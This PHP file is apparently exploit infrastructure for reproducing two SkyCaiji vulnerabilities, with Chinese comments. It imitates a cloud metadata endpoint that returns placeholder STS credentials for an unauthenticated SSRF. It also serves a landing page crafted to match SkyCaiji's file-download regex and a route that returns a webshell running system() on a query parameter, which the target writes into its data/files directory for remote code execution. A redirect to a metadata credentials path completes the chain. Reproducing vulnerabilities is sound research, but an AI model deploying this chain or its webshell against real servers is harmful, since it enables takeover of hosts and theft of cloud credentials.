<?php
/*
 * 多用途内网服务(仅复现用):
 *  1) 云元数据模拟(默认路径): 返回伪造 STS 临时凭据 —— 用于 V1(未认证SSRF→临时AK/SK)。
 *  2) /p      : 攻击者落地页，正文含一个“裸” http URL 指向下方 webshell(供 download_op=is_file 正则提取)。
 *  3) /x.php  : 返回 webshell 的 PHP 源码(作为 HTTP 响应体)，被 SkyCaiji 文件本地化原样写入 data/files/*.php —— 用于 V4(未认证→RCE)。
 */
$uri = $_SERVER['REQUEST_URI'];

if (strpos($uri, '/p') === 0) {
    // 正文里放一个“裸”URL(不被引号包裹)，命中 is_file 正则 /(?<!['"])\bhttps?:\/\/[^\s'"<>]+(?!['"])/i
    header('Content-Type: text/plain');
    echo "attacker landing page\nfile: http://metadata.internal/x.php\n";
    exit;
}

if (strpos($uri, '/x.php') === 0) {
    // 作为 HTTP 响应体返回 webshell 源码(HTTP 200)；SkyCaiji 会把该响应体写成 data/files/<...>.php
    header('Content-Type: application/octet-stream');
    echo "<?php echo 'SKYCAIJI-RCE-PWNED:'; system(\$_GET['c'] ?? 'id'); ?>";
    exit;
}

if (strpos($uri, '/redirect') === 0) {
    header('Location: http://metadata.internal/latest/meta-data/ram/security-credentials/myrole', true, 302);
    exit;
}

header('Content-Type: application/json');
echo json_encode(array(
    "AccessKeyId"     => "EXAMPLE-STS-ACCESS-KEY-ID-PLACEHOLDER",
    "AccessKeySecret" => "EXAMPLE-STS-ACCESS-KEY-SECRET-PLACEHOLDER",
    "SecurityToken"   => "EXAMPLE-STS-SESSION-TOKEN-PLACEHOLDER",
    "Expiration"      => "2026-10-07T00:00:00Z",
    "Code"            => "Success",
    "LastUpdated"     => "2026-10-06T00:00:00Z",
));
